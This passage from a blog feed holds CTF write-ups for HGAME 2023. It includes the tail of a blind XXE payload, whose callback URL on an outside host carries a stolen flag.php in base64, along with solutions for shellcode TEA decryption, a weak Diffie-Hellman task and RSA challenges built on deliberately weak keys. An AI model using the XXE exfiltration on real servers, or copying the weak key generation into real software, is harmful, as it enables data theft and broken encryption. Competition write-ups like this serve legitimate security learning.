class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;name&gt;s&lt;/name&gt;&lt;email&gt;d&lt;/email&gt;&lt;content&gt;sss&lt;/content&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>在pipedream得到回显：</p><p><code>https://eo3dgkbstljeu1v.m.pipedream.net?p=PD9waHAgDQogICAgJGZsYWcxID0gImhnYW1le0JlX0F3YXJlXzBmX1hYZUJsMW5kMW5qZWN0aTBufSI7DQo/Pg==</code></p><p>base64解码得 <code>flag.php</code> 内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$flag1</span> = <span class="string">&quot;hgame&#123;Be_Aware_0f_XXeBl1nd1njecti0n&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><blockquote><p>兔兔的电脑不小心中了病毒，病毒把他写的论文给加密了，你能帮兔兔恢复吗？</p></blockquote><p>Go程序，在 <code>main_main()</code> 中查看代码逻辑，结合题目，其中一个长base64编码字符串可能为调用的shellcode字符串。</p><p>提取出来：</p><p><code>VUiD7FBIjWwkIEiJTUBIi0VAiwCJRQC4BAAAAEgDRUCLAIlFBMdFCAAAAADHRQwj782rx0UQFgAAAMdFFCEAAADHRRgsAAAAx0UcNwAAAMdFIAAAAACLRSCD+CBzWotFDANFCIlFCItFBMHgBANFEItVCANVBDPCi1UEweoFA1UUM8IDRQCJRQCLRQDB4AQDRRiLVQgDVQAzwotVAMHqBQNVHDPCA0UEiUUEuAEAAAADRSCJRSDrnkiLRUCLVQCJELgEAAAASANFQItVBIkQSI1lMF3D</code></p><p>解码后保存为文件，使用IDA查看，识别为函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">sub_1</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+20h] [rbp+0h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+40h] [rbp+20h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v3 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 += <span class="number">0xABCDEF23</span>;</span><br><span class="line">    v2 += ((v3 &gt;&gt; <span class="number">5</span>) + <span class="number">33</span>) ^ (v3 + v4) ^ (<span class="number">16</span> * v3 + <span class="number">22</span>);</span><br><span class="line">    v3 += ((v2 &gt;&gt; <span class="number">5</span>) + <span class="number">55</span>) ^ (v2 + v4) ^ (<span class="number">16</span> * v2 + <span class="number">44</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v2;</span><br><span class="line">  result = a1 + <span class="number">1</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>易知代码为魔改了Delta值的TEA加密算法，解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xABCDEF23</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0xABCDEF23</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">c = [bytes_to_long(f[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)][::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">key = [<span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    d = decrypt(c[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">    flag += long_to_bytes(d[<span class="number">0</span>])[::-<span class="number">1</span>] + long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">               </span><br><span class="line"><span class="comment"># b&quot;hgame&#123;th1s_1s_th3_tutu&#x27;s_h0mew0rk&#125;\x00&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)&lt;br&gt;线上赛平台：&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;请尽</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 3</title>
    <link href="https://lazzzaro.github.io/2023/01/30/match-HGAME-2023-Week-3/"/>
    <id>https://lazzzaro.github.io/2023/01/30/match-HGAME-2023-Week-3/</id>
    <published>2023-01-30T09:25:16.000Z</published>
    <updated>2023-01-30T06:01:55.753Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)<br>线上赛平台：<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭<br>本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址<br>比赛奖金(针对校外榜)：<br>第1名：1000Pwnhub金币<br>第2名：800Pwnhub金币<br>第3名：600Pwnhub金币<br>4-10名：300Pwnhub金币<br>补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个<br>注意：<br>* 所有选手均以个人为单位参赛；<br>* 在解题过程中遇到瓶颈或困难可以私聊出题人<br>* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。<br>* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。<br>* 每周比赛结束后本周前20名需提交wp到指定邮箱<br>本比赛最终解释权归 Vidar-Team 所有</p><p><strong>Rank: 7</strong></p><hr><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel"></a>Tunnel</h3><blockquote><p>Just a very very very safe tunnel.</p><p>HINTS:</p><p>由于附件有问题分数下调至50分</p></blockquote><p>16进制查看器，搜索 <code>hgame</code> ，有 <code>hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ezDH"><a href="#ezDH" class="headerlink" title="ezDH"></a>ezDH</h3><blockquote><p>这大过年的，Bob给Alice发了什么消息呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> Alice_secret, Bob_secret, FLAG</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N=<span class="number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">A = power_mod(g, Alice_secret, N)</span><br><span class="line">f.write(<span class="string">&quot;Alice send to Bob: &#123;&#123; &#x27;g&#x27;: &#123;g&#125;, &#x27;A&#x27;: &#123;A&#125; &#125;&#125;\n&quot;</span>.<span class="built_in">format</span>(g=g, A=<span class="built_in">hex</span>(A)))</span><br><span class="line">B = power_mod(g, Bob_secret, N)</span><br><span class="line">f.write(<span class="string">&quot;Bob send to Alice: &#123;&#123;&#x27;B&#x27;: &#123;B&#125; &#125;&#125;\n&quot;</span>.<span class="built_in">format</span>(B=<span class="built_in">hex</span>(B)))</span><br><span class="line"></span><br><span class="line">shared_secret = <span class="built_in">pow</span>(A, Bob_secret, N)</span><br><span class="line"></span><br><span class="line">p=<span class="number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span></span><br><span class="line">a=-<span class="number">3</span></span><br><span class="line">b=<span class="number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E.random_point()</span><br><span class="line">Pa = shared_secret * G</span><br><span class="line">f.write(<span class="string">f&quot;Alice send to Bob: &#123;&#123; &#x27;E&#x27;: <span class="subst">&#123;E&#125;</span>, &#x27;G&#x27;: <span class="subst">&#123;G.xy()&#125;</span>, &#x27;Pa&#x27;: <span class="subst">&#123;Pa.xy()&#125;</span> &#125;&#125;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">k = random.randint(<span class="number">2</span>, p)</span><br><span class="line">m = E.lift_x(Integer(bytes_to_long(FLAG)))</span><br><span class="line">P1 = k * G</span><br><span class="line">P2 = k * Pa</span><br><span class="line">c = m + P2</span><br><span class="line">f.write(<span class="string">f&quot;Bob send to Alice: &#123;&#123; <span class="subst">&#123;P1.xy()&#125;</span>, <span class="subst">&#123;c.xy()&#125;</span> &#125;&#125;\n&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>$N$ 为质数，$N-1$ 足够光滑，DLP易求，再利用 $c=m+P_2=m+kP_a=m+ksG=m+sP_1$，代入 $c,s,P_1$ 求得 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">A = <span class="number">0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833</span></span><br><span class="line">B = <span class="number">0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510dde</span></span><br><span class="line"></span><br><span class="line">b = discrete_log(mod(B,N),mod(g,N))</span><br><span class="line">s = <span class="built_in">pow</span>(A,b,N)</span><br><span class="line"></span><br><span class="line">p = <span class="number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span></span><br><span class="line">a = -<span class="number">3</span></span><br><span class="line">b = <span class="number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E(<span class="number">6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915</span>, <span class="number">3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206</span>)</span><br><span class="line">Pa = E(<span class="number">2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698</span>, <span class="number">1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773</span>)</span><br><span class="line">P1 = E(<span class="number">2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647</span>, <span class="number">3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868</span>)</span><br><span class="line">c = E(<span class="number">6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522</span>, <span class="number">6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395</span>)</span><br><span class="line"></span><br><span class="line">m = c - s*P1</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Weak_p@ramet3r_make_DHKE_broken&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="RSA-大冒险2"><a href="#RSA-大冒险2" class="headerlink" title="RSA 大冒险2"></a>RSA 大冒险2</h3><blockquote><p>好耶，又是大冒险！</p><p>HINTS:</p><p>Challenge 3: p泄漏的位数不够多，导致coppersmith方法解不出来，那么有没有什么办法能够扩大coppersmith的界呢？注意coppersmith方法使用了LLL算法，那么这个界和格基又有什么关系呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge1.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall1_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">create_keypair</span>(<span class="params">size</span>):</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                p = getPrime(size // <span class="number">2</span>)</span><br><span class="line">                q = getPrime(size // <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">if</span> q &lt; p &lt; <span class="number">2</span>*q:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            max_d = isqrt(isqrt(N)) // <span class="number">3</span></span><br><span class="line">            max_d_bits = max_d.bit_length() - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                d = getRandomNBitInteger(max_d_bits)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    e = <span class="built_in">int</span>(inverse(d, phi))</span><br><span class="line">                <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (e * d) % phi == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">return</span> N, e, d</span><br><span class="line">        self.N, self.e, self.d = create_keypair(<span class="number">1024</span>)</span><br><span class="line">        self.m = chall1_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_ ,self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge2.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall2_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_prime</span>(<span class="params">p</span>):</span><br><span class="line">    k=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime(p+k):</span><br><span class="line">            <span class="keyword">return</span> p+k</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">creat_keypair</span>(<span class="params">nbits, beta</span>):</span><br><span class="line">            p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            q = next_prime(p+getRandomNBitInteger(<span class="built_in">int</span>(nbits*beta)))</span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                e = getRandomNBitInteger(<span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> GCD(e, phi) == <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            <span class="keyword">return</span> N, e, d</span><br><span class="line">        self.N, self.e, self.d = creat_keypair(<span class="number">1024</span>, <span class="number">0.25</span>)</span><br><span class="line">        self.m = chall2_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge3.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall3_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">create_keypair</span>(<span class="params">nbits</span>):</span><br><span class="line">            p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            e = <span class="number">65537</span></span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            leak = p &gt;&gt; <span class="number">253</span></span><br><span class="line">            <span class="keyword">return</span> N, e, d, leak</span><br><span class="line">        self.N, self.e, self.d, self.leak = create_keypair(<span class="number">1024</span>)</span><br><span class="line">        self.m = chall3_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e, <span class="string">&quot;leak&quot;</span>:self.leak&#125;</span><br></pre></td></tr></table></figure></blockquote><p>求解三层RSA拿flag。</p><p>第一层，$q&lt;p&lt;2q,d&lt;\cfrac{1}{3}N^{\frac{1}{4}}$，满足Wiener Attack条件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 